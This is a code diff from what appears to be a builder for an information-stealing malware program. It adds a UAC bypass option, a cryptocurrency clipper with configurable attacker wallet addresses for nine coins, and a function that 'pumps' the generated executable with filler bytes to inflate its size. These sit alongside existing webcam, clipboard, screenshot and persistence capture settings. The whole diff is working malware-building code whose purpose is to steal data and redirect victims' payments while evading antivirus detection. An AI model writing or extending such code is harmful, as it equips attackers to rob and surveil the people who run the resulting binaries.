@@ -46,6 +46,17 @@ struct RecoverySettings {
     capture_webcams: Option<bool>,
     capture_clipboard: Option<bool>,
     persistence: Option<bool>,
+    uac_bypass: Option<bool>,
+    clipper: Option<bool>,
+    btc_address: Option<String>,
+    eth_address: Option<String>,
+    ltc_address: Option<String>,
+    xmr_address: Option<String>,
+    doge_address: Option<String>,
+    dash_address: Option<String>,
+    sol_address: Option<String>,
+    trx_address: Option<String>,
+    ada_address: Option<String>,
     pump_size_mb: Option<u32>,
     blocked_countries: Option<Vec<String>>,
     custom_extensions: Option<Vec<String>>,
@@ -126,6 +137,34 @@ fn render_defaults_rs(settings: &RecoverySettings) -> Result<String, String> {
     let default_capture_webcams = settings.capture_webcams.unwrap_or(false);
     let default_capture_clipboard = settings.capture_clipboard.unwrap_or(false);
     let default_persistence = settings.persistence.unwrap_or(false);
+    let default_uac_bypass = settings.uac_bypass.unwrap_or(false);
+    let default_clipper = settings.clipper.unwrap_or(false);
+
+    let default_btc = settings.btc_address.as_deref().map(escape_rust_string);
+    let default_eth = settings.eth_address.as_deref().map(escape_rust_string);
+    let default_ltc = settings.ltc_address.as_deref().map(escape_rust_string);
+    let default_xmr = settings.xmr_address.as_deref().map(escape_rust_string);
+    let default_doge = settings.doge_address.as_deref().map(escape_rust_string);
+    let default_dash = settings.dash_address.as_deref().map(escape_rust_string);
+    let default_sol = settings.sol_address.as_deref().map(escape_rust_string);
+    let default_trx = settings.trx_address.as_deref().map(escape_rust_string);
+    let default_ada = settings.ada_address.as_deref().map(escape_rust_string);
+    
+    let format_opt = |opt: Option<String>| match opt {
+        Some(v) => format!("Some(\"{}\")", v),
+        None => "None".to_string(),
+    };
+
+    let default_btc_val = format_opt(default_btc);
+    let default_eth_val = format_opt(default_eth);
+    let default_ltc_val = format_opt(default_ltc);
+    let default_xmr_val = format_opt(default_xmr);
+    let default_doge_val = format_opt(default_doge);
+    let default_dash_val = format_opt(default_dash);
+    let default_sol_val = format_opt(default_sol);
+    let default_trx_val = format_opt(default_trx);
+    let default_ada_val = format_opt(default_ada);
+
     let default_pump_size_mb = settings.pump_size_mb.unwrap_or(0);
 
     let default_blocked_countries = if let Some(countries) = &settings.blocked_countries {
@@ -206,6 +245,17 @@ pub static DEFAULT_CAPTURE_SCREENSHOTS: bool = {default_capture_screenshots};
 pub static DEFAULT_CAPTURE_WEBCAMS: bool = {default_capture_webcams};
 pub static DEFAULT_CAPTURE_CLIPBOARD: bool = {default_capture_clipboard};
 pub static DEFAULT_PERSISTENCE: bool = {default_persistence};
+pub static DEFAULT_UAC_BYPASS: bool = {default_uac_bypass};
+pub static DEFAULT_CLIPPER_ENABLED: bool = {default_clipper};
+pub static DEFAULT_BTC_ADDRESS: Option<&str> = {default_btc_val};
+pub static DEFAULT_ETH_ADDRESS: Option<&str> = {default_eth_val};
+pub static DEFAULT_LTC_ADDRESS: Option<&str> = {default_ltc_val};
+pub static DEFAULT_XMR_ADDRESS: Option<&str> = {default_xmr_val};
+pub static DEFAULT_DOGE_ADDRESS: Option<&str> = {default_doge_val};
+pub static DEFAULT_DASH_ADDRESS: Option<&str> = {default_dash_val};
+pub static DEFAULT_SOL_ADDRESS: Option<&str> = {default_sol_val};
+pub static DEFAULT_TRX_ADDRESS: Option<&str> = {default_trx_val};
+pub static DEFAULT_ADA_ADDRESS: Option<&str> = {default_ada_val};
 pub static DEFAULT_PUMP_SIZE_MB: u32 = {default_pump_size_mb};
 pub static DEFAULT_BLOCKED_COUNTRIES: Option<&[&str]> = {default_blocked_countries};
 pub static DEFAULT_CUSTOM_EXTENSIONS: Option<&[&str]> = {default_custom_extensions};
@@ -358,6 +408,17 @@ fn build_ixodes_sync(app: AppHandle, request: BuildRequest) -> Result<BuildResul
         });
     }
 
+    // Server-side Pumping: Inflate the binary size now so it's delivered pre-pumped
+    if let Some(pump_mb) = request.settings.pump_size_mb {
+        if pump_mb > 0 {
+            if let Err(err) = pump_file_on_server(&exe_path, pump_mb) {
+                combined = format!("{}\nWarning: server-side pumping failed: {}", combined.trim(), err);
+            } else {
+                combined = format!("{}\nInfo: binary pumped to {} MB", combined.trim(), pump_mb);
+            }
+        }
+    }
+
     let moved_to = if let Some(output_dir) = request.output_dir.as_deref().map(str::trim) {
         if output_dir.is_empty() {
             None
@@ -451,6 +512,72 @@ fn set_env_if_present(command: &mut Command, key: &str, value: Option<&str>) {
     if let Some(value) = value.map(str::trim).filter(|value| !value.is_empty()) {
         command.env(key, value);
     }
+}
+
+fn pump_file_on_server(path: &Path, target_mb: u32) -> Result<(), String> {
+    use rand::Rng;
+    use std::io::{Seek, SeekFrom, Write};
+
+    let target_size = (target_mb as u64) * 1024 * 1024;
+    let mut file = fs::OpenOptions::new()
+        .read(true)
+        .write(true)
+        .open(path)
+        .map_err(|err| format!("failed to open exe for pumping: {err}"))?;
+
+    let current_size = file
+        .metadata()
+        .map_err(|err| format!("failed to get metadata: {err}"))?
+        .len();
+
+    if current_size >= target_size {
+        return Ok(());
+    }
+
+    let needed = target_size - current_size;
+    file.seek(SeekFrom::End(0))
+
+        .map_err(|err| format!("failed to seek: {err}"))?;
+
+    let mut rng = rand::thread_rng();
+    let chunk_size = 1024 * 512;
+    let mut remaining = needed;
+
+    while remaining > 0 {
+        let to_write = std::cmp::min(remaining, chunk_size as u64) as usize;
+        let mut buffer = vec![0u8; to_write];
+
+        let mode = rng.gen_range(0..4);
+        match mode {
+            0 => {
+                rng.fill(&mut buffer[..]);
+            }
+            1 => {
+                let pattern = [0x41, 0x42, 0x43, 0x44, 0x00];
+                for i in 0..to_write {
+                    buffer[i] = pattern[i % pattern.len()];
+                }
+            }
+            2 => {
+                for i in (0..to_write).step_by(16) {
+                    if rng.gen_bool(0.1) {
+                        buffer[i] = rng.gen();
+                    }
+                }
+            }
+            _ => {
+                for i in 0..to_write {
+                    buffer[i] = rng.gen_range(32..126);
+                }
+            }
+        }
+
+        file.write_all(&buffer)
+            .map_err(|err| format!("failed to write pumped data: {err}"))?;
+        remaining -= to_write as u64;
+    }
+
+    Ok(())
 }
 
 fn resolve_icon_path(
